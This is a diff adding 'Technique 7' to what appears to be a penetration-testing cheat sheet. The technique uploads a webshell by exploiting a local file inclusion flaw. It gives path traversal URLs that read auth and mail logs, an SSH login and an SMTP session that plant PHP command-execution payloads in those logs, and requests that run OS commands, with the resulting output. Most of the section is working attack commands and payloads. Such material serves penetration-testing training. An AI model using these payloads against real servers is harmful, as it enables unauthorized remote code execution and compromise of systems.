@@ -410,6 +410,50 @@ Example
 	   - http://x.x.x.x/application/fileviewer.php?p=http://x.x.x.x/webshell
 ```
 
+##### Technique 7 - Webshell upload by exploiting a LFI vulnerability
+```
+Example
+➤ Step 1. You find a website on an internal network that is vulnerable to a Local File Include vulnerability and you can read log files such as '/var/log/auth.log' and '/var/log/mail'.
+	   Examples:
+	   > http://website/index.php?lang=../../../../var/log/auth.log
+	   > http://website/index.php?lang=../../../../var/log/mail
+
+➤ Step 2. Add a malicious PHP webshell in the log files '/var/log/auth.log' and '/var/log/mail', if you can attempt to log into the SSH server 
+	   or if you can log anonymously into the SMTP server of the Linux server. 
+ 	   Examples:
+	   -[SSH] root@kali:~# ssh '<?php echo system($_GET["cmd"]); exit; ?>'@X.X.X.X
+	   -[SMTP] root@kali:~# telnet X.X.X.X 25
+ 	                        Trying X.X.X.X...
+ 	                        Connected to X.X.X.X.
+ 	                        Escape character is '^]'.
+ 	                        220 straylight ESMTP Postfix (Debian/GNU)
+ 	                        FROM anonymous@straylight
+ 	                        502 5.5.2 Error: command not recognized
+ 	                        AIL FROM: anonymous@straylight
+ 	                        250 2.1.0 Ok
+ 	                        RCPT TO: <?php echo shell_exec("id;pwd;uname -a;2>&1"); ?>
+ 	                        501 5.1.3 Bad recipient address syntax
+
+➤ Step 3. Execute the PHP Webshell stored in the log files '/var/log/auth.log' and '/var/log/mail' via via the Local File Include vulnerability. 
+	   Examples:
+	   > http://website/index.php?lang=../../../../var/log/auth.log&cmd=whoami
+	     + HTTP response:  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	     
+	   > http://website/index.php?lang=../../../../var/log/mail
+	   
+	     + HTTP response containg the result of our OS commands:
+	       <html>
+	       <style>
+	       <SNIP>
+	       Aug 23 18:45:28 straylight postfix/smtpd[2886]: connect from unknown[192.168.1.8]
+	       Aug 23 18:46:36 straylight postfix/smtpd[2886]: warning: Illegal address syntax from unknown[192.168.1.8] in RCPT command: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	       /var/www/html/
+	       Linux server01 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux
+	       <SNIP>
+	       </body>
+	       </html>
+```
+
 ##### Technique 8 - Webshell upload by exploiting an insecure (writable) file share (CIFS) of a Windows IIS Web server (i.e., C:\inetpub\wwwroot\)
 
 ```
